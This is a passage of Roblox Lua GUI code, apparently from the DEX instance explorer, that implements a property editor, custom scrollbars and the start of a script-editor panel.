			local propertyType = propertyData["ValueType"]

			local box = CreateObject(readOnly,function()end)
			box.Size = UDim2.new(1, -2 * Styles.Margin, 1, 0)
			box.Position = UDim2.new(0, Styles.Margin, 0, 0)

			local function update()
				if AwaitingObjectObj == object then
					if AwaitingObjectValue == true then
						box.Text = "Select an Object"
						return
					end
				end
				local value = object[propertyName]
				box.Text = ToString(value, propertyType)
			end

			if not readOnly then
				box.MouseButton1Click:connect(function()
					if AwaitingObjectValue then
						AwaitingObjectValue = false
						update()
						return
					end
					AwaitingObjectValue = true
					AwaitingObjectObj = object
					AwaitingObjectProp = propertyData
					box.Text = "Select an Object"
				end)

				box.Cancel.Visible = true
				box.Cancel.MouseButton1Click:connect(function()
					object[propertyName] = nil
				end)
			end

			update()

			object.Changed:connect(function(property)
				if (property == propertyName) then
					update()
				end
			end)

			if object:IsA("ObjectValue") then
				object.Changed:connect(function(val)
					update()
				end)
			end

			return box
		end

		function GetControl(object, propertyData, readOnly)
			local propertyType = propertyData["ValueType"]
			local control = nil

			if Controls[propertyType] then
				control = Controls[propertyType](object, propertyData, readOnly)
			elseif RbxApi.IsEnum(propertyType) then
				control = Controls["Enum"](object, propertyData, readOnly)
			else
				control = Controls["default"](object, propertyData, readOnly)
			end
			return control
		end
		-- Permissions

		function CanEditObject(object)
			local player = Players.LocalPlayer
			local character = player.Character
			return Permissions.CanEdit
		end

		function CanEditProperty(object,propertyData)
			local tags = propertyData["tags"]
			for _,name in pairs(tags) do
				if name == "readonly" then
					return false
				end
			end
			return CanEditObject(object)
		end

		--RbxApi
		local function PropertyIsHidden(propertyData)
			local tags = propertyData["tags"]
			for _,name in pairs(tags) do
				if name == "deprecated"
					or name == "hidden"
					or name == "writeonly" then
					return true
				end
			end
			return false
		end

		function Set(object, propertyData, value)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]

			if value == nil then return end

			for i,v in pairs(GetSelection()) do
				if CanEditProperty(v,propertyData) then
					pcall(function()
						--print("Setting " .. propertyName .. " to " .. tostring(value))
						v[propertyName] = value
					end)
				end
			end
		end

		function CreateRow(object, propertyData, isAlternateRow)
			local propertyName = propertyData["Name"]
			local propertyType = propertyData["ValueType"]
			local propertyValue = object[propertyName]
			--rowValue, rowValueType, isAlternate
			local backColor = Row.BackgroundColor;
			if (isAlternateRow) then
				backColor = Row.BackgroundColorAlternate
			end

			local readOnly = not CanEditProperty(object, propertyData)
			if propertyType == "Instance" or propertyName == "Parent" then readOnly = true end

			local rowFrame = Instance.new("Frame")
			rowFrame.Size = UDim2.new(1,0,0,Row.Height)
			rowFrame.BackgroundTransparency = 1
			rowFrame.Name = 'Row'

			local propertyLabelFrame = CreateCell()
			propertyLabelFrame.Parent = rowFrame
			propertyLabelFrame.ClipsDescendants = true

			local propertyLabel = CreateLabel(readOnly)
			propertyLabel.Text = propertyName
			propertyLabel.Size = UDim2.new(1, -1 * Row.TitleMarginLeft, 1, 0)
			propertyLabel.Position = UDim2.new(0, Row.TitleMarginLeft, 0, 0)
			propertyLabel.Parent = propertyLabelFrame

			local propertyValueFrame = CreateCell()
			propertyValueFrame.Size = UDim2.new(0.5, -1, 1, 0)
			propertyValueFrame.Position = UDim2.new(0.5, 0, 0, 0)
			propertyValueFrame.Parent = rowFrame

			local control = GetControl(object, propertyData, readOnly)
			control.Parent = propertyValueFrame

			rowFrame.MouseEnter:connect(function()
				propertyLabelFrame.BackgroundColor3 = Row.BackgroundColorMouseover
				propertyValueFrame.BackgroundColor3 = Row.BackgroundColorMouseover
			end)
			rowFrame.MouseLeave:connect(function()
				propertyLabelFrame.BackgroundColor3 = backColor
				propertyValueFrame.BackgroundColor3 = backColor
			end)

			propertyLabelFrame.BackgroundColor3 = backColor
			propertyValueFrame.BackgroundColor3 = backColor

			return rowFrame
		end

		function ClearPropertiesList()
			for _,instance in pairs(ContentFrame:GetChildren()) do
				instance:Destroy()
			end
		end

		local selection = Gui:FindFirstChild("Selection", 1)
		print(selection)

		function displayProperties(props)
			for i,v in pairs(props) do
				pcall(function()
					local a = CreateRow(v.object, v.propertyData, ((numRows % 2) == 0))
					a.Position = UDim2.new(0,0,0,numRows*Row.Height)
					a.Parent = ContentFrame
					numRows = numRows + 1
				end)
			end
		end

		function checkForDupe(prop,props)
			for i,v in pairs(props) do
				if v.propertyData.Name == prop.Name and v.propertyData.ValueType == prop.ValueType then
					return true
				end
			end
			return false
		end

		function sortProps(t)
			table.sort(t, 
				function(x,y) return x.propertyData.Name < y.propertyData.Name
				end)
		end

		function showProperties(obj)
			ClearPropertiesList()
			if obj == nil then return end
			local propHolder = {}
			local foundProps = {}
			numRows = 0
			for _,nextObj in pairs(obj) do
				if not foundProps[nextObj.className] then
					foundProps[nextObj.className] = true
					for i,v in pairs(RbxApi.GetProperties(nextObj.className)) do
						local suc, err = pcall(function()
							if not (PropertyIsHidden(v)) and not checkForDupe(v,propHolder) then
								if string.find(string.lower(v.Name),string.lower(propertiesSearch.Text)) or not searchingProperties() then
									table.insert(propHolder,{propertyData = v, object = nextObj})
								end
							end
						end)
				--[[if not suc then 
					warn("Problem getting the value of property " .. v.Name .. " | " .. err)
				end	--]]
					end
				end
			end
			sortProps(propHolder)
			displayProperties(propHolder)
			ContentFrame.Size = UDim2.new(1, 0, 0, numRows * Row.Height)
			scrollBar.ScrollIndex = 0
			scrollBar.TotalSpace = numRows * Row.Height
			scrollBar.Update()
		end

		----------------------------------------------------------------
		-----------------------SCROLLBAR STUFF--------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		local ScrollBarWidth = 16

		local ScrollStyles = {
			Background      = Color3.new(233/255, 233/255, 233/255);
			Border          = Color3.new(149/255, 149/255, 149/255);
			Selected        = Color3.new( 63/255, 119/255, 189/255);
			BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
			Text            = Color3.new(  0/255,   0/255,   0/255);
			TextDisabled    = Color3.new(128/255, 128/255, 128/255);
			TextSelected    = Color3.new(255/255, 255/255, 255/255);
			Button          = Color3.new(221/255, 221/255, 221/255);
			ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
			ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
			Field           = Color3.new(255/255, 255/255, 255/255);
			FieldBorder     = Color3.new(191/255, 191/255, 191/255);
			TitleBackground = Color3.new(178/255, 178/255, 178/255);
		}
		do
			local ZIndexLock = {}
			function SetZIndex(object,z)
				if not ZIndexLock[object] then
					ZIndexLock[object] = true
					if object:IsA'GuiObject' then
						object.ZIndex = z
					end
					local children = object:GetChildren()
					for i = 1,#children do
						SetZIndex(children[i],z)
					end
					ZIndexLock[object] = nil
				end
			end
		end
		function SetZIndexOnChanged(object)
			return object.Changed:connect(function(p)
				if p == "ZIndex" then
					SetZIndex(object,object.ZIndex)
				end
			end)
		end
		function Create(ty,data)
			local obj
			if type(ty) == 'string' then
				obj = Instance.new(ty)
			else
				obj = ty
			end
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end
		-- returns the ascendant ScreenGui of an object
		function GetScreen(screen)
			if screen == nil then return nil end
			while not screen:IsA("ScreenGui") do
				screen = screen.Parent
				if screen == nil then return nil end
			end
			return screen
		end
		-- AutoButtonColor doesn't always reset properly
		function ResetButtonColor(button)
			local active = button.Active
			button.Active = not active
			button.Active = active
		end

		function ArrowGraphic(size,dir,scaled,template)
			local Frame = Create('Frame',{
				Name = "Arrow Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size,0,size);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			local transform
			if dir == nil or dir == 'Up' then
				function transform(p,s) return p,s end
			elseif dir == 'Down' then
				function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
			elseif dir == 'Left' then
				function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			elseif dir == 'Right' then
				function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			end

			local scale
			if scaled then
				function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
			else
				function scale(p,s) return p,s end
			end

			local o = math.floor(size/4)
			if size%2 == 0 then
				local n = size/2-1
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,(i+1)*2,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			else
				local n = (size-1)/2
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,i*2+1,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			end
			if size%4 > 1 then
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,0,0,size-o-1),
					UDim2.new(0,size,0,1)
					))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
			return Frame
		end

		function GripGraphic(size,dir,spacing,scaled,template)
			local Frame = Create('Frame',{
				Name = "Grip Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size.x,0,size.y);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			spacing = spacing or 2

			local scale
			if scaled then
				function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
			else
				function scale(p) return p end
			end

			if dir == 'Vertical' then
				for i=0,size.x-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,1,0,size.y))
					t.Position = scale(UDim2.new(0,i,0,0))
					t.Parent = Frame
				end
			elseif dir == nil or dir == 'Horizontal' then
				for i=0,size.y-1,spacing do
					local t = template:Clone()
					t.Size = scale(UDim2.new(0,size.x,0,1))
					t.Position = scale(UDim2.new(0,0,0,i))
					t.Parent = Frame
				end
			end

			return Frame
		end

		do
			local mt = {
				__index = {
					GetScrollPercent = function(self)
						return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
					end;
					CanScrollDown = function(self)
						return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
					end;
					CanScrollUp = function(self)
						return self.ScrollIndex > 0
					end;
					ScrollDown = function(self)
						self.ScrollIndex = self.ScrollIndex + self.PageIncrement
						self:Update()
					end;
					ScrollUp = function(self)
						self.ScrollIndex = self.ScrollIndex - self.PageIncrement
						self:Update()
					end;
					ScrollTo = function(self,index)
						self.ScrollIndex = index
						self:Update()
					end;
					SetScrollPercent = function(self,percent)
						self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
						self:Update()
					end;
				};
			}
			mt.__index.CanScrollRight = mt.__index.CanScrollDown
			mt.__index.CanScrollLeft = mt.__index.CanScrollUp
			mt.__index.ScrollLeft = mt.__index.ScrollUp
			mt.__index.ScrollRight = mt.__index.ScrollDown

			function ScrollBar(horizontal)
				-- create row scroll bar
				local ScrollFrame = Create('Frame',{
					Name = "ScrollFrame";
					Position = horizontal and UDim2.new(0,0,1,-ScrollBarWidth) or UDim2.new(1,-ScrollBarWidth,0,0);
					Size = horizontal and UDim2.new(1,0,0,ScrollBarWidth) or UDim2.new(0,ScrollBarWidth,1,0);
					BackgroundTransparency = 1;
					Create('ImageButton',{
						Name = "ScrollDown";
						Position = horizontal and UDim2.new(1,-ScrollBarWidth,0,0) or UDim2.new(0,0,1,-ScrollBarWidth);
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollUp";
						Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
						BackgroundColor3 = ScrollStyles.Button;
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
					});
					Create('ImageButton',{
						Name = "ScrollBar";
						Size = horizontal and UDim2.new(1,-ScrollBarWidth*2,1,0) or UDim2.new(1,0,1,-ScrollBarWidth*2);
						Position = horizontal and UDim2.new(0,ScrollBarWidth,0,0) or UDim2.new(0,0,0,ScrollBarWidth);
						AutoButtonColor = false;
						BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
						BorderColor3 = ScrollStyles.Border;
						--BorderSizePixel = 0;
						Create('ImageButton',{
							Name = "ScrollThumb";
							AutoButtonColor = false;
							Size = UDim2.new(0, ScrollBarWidth, 0, ScrollBarWidth);
							BackgroundColor3 = ScrollStyles.Button;
							BorderColor3 = ScrollStyles.Border;
							--BorderSizePixel = 0;
						});
					});
				})

				local graphicTemplate = Create('Frame',{
					Name="Graphic";
					BorderSizePixel = 0;
					BackgroundColor3 = ScrollStyles.Border;
				})
				local graphicSize = ScrollBarWidth/2

				local ScrollDownFrame = ScrollFrame.ScrollDown
				local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
				ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollDownGraphic.Parent = ScrollDownFrame
				local ScrollUpFrame = ScrollFrame.ScrollUp
				local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
				ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
				ScrollUpGraphic.Parent = ScrollUpFrame
				local ScrollBarFrame = ScrollFrame.ScrollBar
				local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
				do
					local size = ScrollBarWidth*3/8
					local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
					Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
					Decal.Parent = ScrollThumbFrame
				end

				local MouseDrag = Create('ImageButton',{
					Name = "MouseDrag";
					Position = UDim2.new(-0.25,0,-0.25,0);
					Size = UDim2.new(1.5,0,1.5,0);
					Transparency = 1;
					AutoButtonColor = false;
					Active = true;
					ZIndex = 10;
				})

				local Class = setmetatable({
					GUI = ScrollFrame;
					ScrollIndex = 0;
					VisibleSpace = 0;
					TotalSpace = 0;
					PageIncrement = 1;
				},mt)

				local UpdateScrollThumb
				if horizontal then
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,ScrollBarWidth)
						if ScrollThumbFrame.AbsoluteSize.x < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.x
						ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
					end
				else
					function UpdateScrollThumb()
						ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,Class.VisibleSpace/Class.TotalSpace,0)
						if ScrollThumbFrame.AbsoluteSize.y < ScrollBarWidth then
							ScrollThumbFrame.Size = UDim2.new(0,ScrollBarWidth,0,ScrollBarWidth)
						end
						local barSize = ScrollBarFrame.AbsoluteSize.y
						ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
					end
				end

				local lastDown
				local lastUp
				local scrollStyle = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0}
				local scrollStyle_ds = {BackgroundColor3=ScrollStyles.Border,BackgroundTransparency=0.7}

				local function Update()
					local t = Class.TotalSpace
					local v = Class.VisibleSpace
					local s = Class.ScrollIndex
					if v <= t then
						if s > 0 then
							if s + v > t then
								Class.ScrollIndex = t - v
							end
						else
							Class.ScrollIndex = 0
						end
					else
						Class.ScrollIndex = 0
					end

					if Class.UpdateCallback then
						if Class.UpdateCallback(Class) == false then
							return
						end
					end

					local down = Class:CanScrollDown()
					local up = Class:CanScrollUp()
					if down ~= lastDown then
						lastDown = down
						ScrollDownFrame.Active = down
						ScrollDownFrame.AutoButtonColor = down
						local children = ScrollDownGraphic:GetChildren()
						local style = down and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					if up ~= lastUp then
						lastUp = up
						ScrollUpFrame.Active = up
						ScrollUpFrame.AutoButtonColor = up
						local children = ScrollUpGraphic:GetChildren()
						local style = up and scrollStyle or scrollStyle_ds
						for i = 1,#children do
							Create(children[i],style)
						end
					end
					ScrollThumbFrame.Visible = down or up
					UpdateScrollThumb()
				end
				Class.Update = Update

				SetZIndexOnChanged(ScrollFrame)

				local scrollEventID = 0
				ScrollDownFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollDownFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollDown()
					wait(0.2) -- delay before auto scroll
					while scrollEventID == current do
						Class:ScrollDown()
						if not Class:CanScrollDown() then break end
						wait()
					end
				end)

				ScrollDownFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				ScrollUpFrame.MouseButton1Down:connect(function()
					scrollEventID = tick()
					local current = scrollEventID
					local up_con
					up_con = MouseDrag.MouseButton1Up:connect(function()
						scrollEventID = tick()
						MouseDrag.Parent = nil
						ResetButtonColor(ScrollUpFrame)
						up_con:disconnect(); drag = nil
					end)
					MouseDrag.Parent = GetScreen(ScrollFrame)
					Class:ScrollUp()
					wait(0.2)
					while scrollEventID == current do
						Class:ScrollUp()
						if not Class:CanScrollUp() then break end
						wait()
					end
				end)

				ScrollUpFrame.MouseButton1Up:connect(function()
					scrollEventID = tick()
				end)

				if horizontal then
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if x > ScrollThumbFrame.AbsolutePosition.x then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if x > ScrollThumbFrame.AbsolutePosition.x then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				else
					ScrollBarFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local current = scrollEventID
						local up_con
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollUpFrame)
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
						if y > ScrollThumbFrame.AbsolutePosition.y then
							Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
								Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
								wait()
							end
						else
							Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
							wait(0.2)
							while scrollEventID == current do
								if y > ScrollThumbFrame.AbsolutePosition.y then break end
								Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
								wait()
							end
						end
					end)
				end

				if horizontal then
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
							local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
							local bar_abs_one = bar_abs_pos + bar_drag
							x = x - mouse_offset
							x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
							x = x - bar_abs_pos
							Class:SetScrollPercent(x/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				else
					ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
						scrollEventID = tick()
						local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
						local drag_con
						local up_con
						drag_con = MouseDrag.MouseMoved:connect(function(x,y)
							local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
							local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
							local bar_abs_one = bar_abs_pos + bar_drag
							y = y - mouse_offset
							y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
							y = y - bar_abs_pos
							Class:SetScrollPercent(y/(bar_drag))
						end)
						up_con = MouseDrag.MouseButton1Up:connect(function()
							scrollEventID = tick()
							MouseDrag.Parent = nil
							ResetButtonColor(ScrollThumbFrame)
							drag_con:disconnect(); drag_con = nil
							up_con:disconnect(); drag = nil
						end)
						MouseDrag.Parent = GetScreen(ScrollFrame)
					end)
				end

				function Class:Destroy()
					ScrollFrame:Destroy()
					MouseDrag:Destroy()
					for k in pairs(Class) do
						Class[k] = nil
					end
					setmetatable(Class,nil)
				end

				Update()

				return Class
			end
		end

		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------
		----------------------------------------------------------------

		local MainFrame = Instance.new("Frame")
		MainFrame.Name = "MainFrame"
		MainFrame.Size = UDim2.new(1, -1 * ScrollBarWidth, 1, 0)
		MainFrame.Position = UDim2.new(0, 0, 0, 0)
		MainFrame.BackgroundTransparency = 1
		MainFrame.ClipsDescendants = true
		MainFrame.Parent = PropertiesFrame

		ContentFrame = Instance.new("Frame")
		ContentFrame.Name = "ContentFrame"
		ContentFrame.Size = UDim2.new(1, 0, 0, 0)
		ContentFrame.BackgroundTransparency = 1
		ContentFrame.Parent = MainFrame

		scrollBar = ScrollBar(false)
		scrollBar.PageIncrement = 1
		Create(scrollBar.GUI,{
			Position = UDim2.new(1,-ScrollBarWidth,0,0);
			Size = UDim2.new(0,ScrollBarWidth,1,0);
			Parent = PropertiesFrame;
		})

		scrollBarH = ScrollBar(true)
		scrollBarH.PageIncrement = ScrollBarWidth
		Create(scrollBarH.GUI,{
			Position = UDim2.new(0,0,1,-ScrollBarWidth);
			Size = UDim2.new(1,-ScrollBarWidth,0,ScrollBarWidth);
			Visible = false;
			Parent = PropertiesFrame;
		})

		do
			local listEntries = {}
			local nameConnLookup = {}

			function scrollBar.UpdateCallback(self)
				scrollBar.TotalSpace = ContentFrame.AbsoluteSize.Y
				scrollBar.VisibleSpace = MainFrame.AbsoluteSize.Y
				ContentFrame.Position = UDim2.new(ContentFrame.Position.X.Scale,ContentFrame.Position.X.Offset,0,-1*scrollBar.ScrollIndex)
			end

			function scrollBarH.UpdateCallback(self)

			end

			MainFrame.Changed:connect(function(p)
				if p == 'AbsoluteSize' then
					scrollBarH.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.x)
					scrollBarH:Update()
					scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
					scrollBar:Update()
				end
			end)

			local wheelAmount = Row.Height
			PropertiesFrame.MouseWheelForward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex - wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex - scrollBar.VisibleSpace)
				end
			end)
			PropertiesFrame.MouseWheelBackward:connect(function()
				if scrollBar.VisibleSpace - 1 > wheelAmount then
					scrollBar:ScrollTo(scrollBar.ScrollIndex + wheelAmount)
				else
					scrollBar:ScrollTo(scrollBar.ScrollIndex + scrollBar.VisibleSpace)
				end
			end)
		end

		scrollBar.VisibleSpace = math.ceil(MainFrame.AbsoluteSize.y)
		scrollBar:Update()

		showProperties(GetSelection())

		bindSelectionChanged.Event:connect(function()
			showProperties(GetSelection())
		end)

		bindSetAwait.Event:connect(function(obj)
			if AwaitingObjectValue then
				AwaitingObjectValue = false
				local mySel = obj
				if mySel then
					pcall(function()
						Set(AwaitingObjectObj, AwaitingObjectProp, mySel)
					end)
				end
			end
		end)

		propertiesSearch.Changed:connect(function(prop)
			if prop == "Text" then
				showProperties(GetSelection())
			end
		end)

		bindGetApi.OnInvoke = function()
			return RbxApi
		end

		bindGetAwait.OnInvoke = function()
			return AwaitingObjectValue
		end
	end)
	spawn(function()
		local top = D_E_X.ScriptEditor

		local editorGrid = top:WaitForChild("EditorGrid")

		local currentSource = ""

		local currentEditor = {
			x = 0,
			y = 0
		}

		local userInput = game:GetService("UserInputService")
		local mouse = game.Players.LocalPlayer:GetMouse()

		local topBar = top:WaitForChild("TopBar")
		local scriptBar = topBar:WaitForChild("ScriptBar")
		local scriptBarLeft = topBar:WaitForChild("ScriptBarLeft")
		local scriptBarRight = topBar:WaitForChild("ScriptBarRight")
		local clipboardButton = topBar:WaitForChild("Clipboard")

		local entryTemplate = topBar:WaitForChild("Entry")

		local openEvent = top:WaitForChild("OpenScript")

		local closeButton = top:WaitForChild("Close")

		local memoryScripts = {}

		local editingIndex = 0

		-- Scrollbar

		local ScrollBarWidth = 16

		local ScrollStyles = {
			Background      = Color3.new(233/255, 233/255, 233/255);
			Border          = Color3.new(149/255, 149/255, 149/255);
			Selected        = Color3.new( 63/255, 119/255, 189/255);
			BorderSelected  = Color3.new( 55/255, 106/255, 167/255);
			Text            = Color3.new(  0/255,   0/255,   0/255);
			TextDisabled    = Color3.new(128/255, 128/255, 128/255);
			TextSelected    = Color3.new(255/255, 255/255, 255/255);
			Button          = Color3.new(221/255, 221/255, 221/255);
			ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
			ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
			Field           = Color3.new(255/255, 255/255, 255/255);
			FieldBorder     = Color3.new(191/255, 191/255, 191/255);
			TitleBackground = Color3.new(178/255, 178/255, 178/255);
		}
		do
			local ZIndexLock = {}
			function SetZIndex(object,z)
				if not ZIndexLock[object] then
					ZIndexLock[object] = true
					if object:IsA'GuiObject' then
						object.ZIndex = z
					end
					local children = object:GetChildren()
					for i = 1,#children do
						SetZIndex(children[i],z)
					end
					ZIndexLock[object] = nil
				end
			end
		end
		function SetZIndexOnChanged(object)
			return object.Changed:connect(function(p)
				if p == "ZIndex" then
					SetZIndex(object,object.ZIndex)
				end
			end)
		end
		function Create(ty,data)
			local obj
			if type(ty) == 'string' then
				obj = Instance.new(ty)
			else
				obj = ty
			end
			for k, v in pairs(data) do
				if type(k) == 'number' then
					v.Parent = obj
				else
					obj[k] = v
				end
			end
			return obj
		end
		-- returns the ascendant ScreenGui of an object
		function GetScreen(screen)
			if screen == nil then return nil end
			while not screen:IsA("ScreenGui") do
				screen = screen.Parent
				if screen == nil then return nil end
			end
			return screen
		end
		-- AutoButtonColor doesn't always reset properly
		function ResetButtonColor(button)
			local active = button.Active
			button.Active = not active
			button.Active = active
		end

		function ArrowGraphic(size,dir,scaled,template)
			local Frame = Create('Frame',{
				Name = "Arrow Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size,0,size);
				Transparency = 1;
			})
			if not template then
				template = Instance.new("Frame")
				template.BorderSizePixel = 0
			end

			local transform
			if dir == nil or dir == 'Up' then
				function transform(p,s) return p,s end
			elseif dir == 'Down' then
				function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
			elseif dir == 'Left' then
				function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			elseif dir == 'Right' then
				function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
			end

			local scale
			if scaled then
				function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
			else
				function scale(p,s) return p,s end
			end

			local o = math.floor(size/4)
			if size%2 == 0 then
				local n = size/2-1
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,(i+1)*2,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			else
				local n = (size-1)/2
				for i = 0,n do
					local t = template:Clone()
					local p,s = scale(transform(
						UDim2.new(0,n-i,0,o+i),
						UDim2.new(0,i*2+1,0,1)
						))
					t.Position = p
					t.Size = s
					t.Parent = Frame
				end
			end
			if size%4 > 1 then
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,0,0,size-o-1),
					UDim2.new(0,size,0,1)
					))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
			return Frame
		end

		function GripGraphic(size,dir,spacing,scaled,template)
			local Frame = Create('Frame',{
				Name = "Grip Graphic";
				BorderSizePixel = 0;
				Size = UDim2.new(0,size.x,0,size.y);
				Transparency = 1;
			})
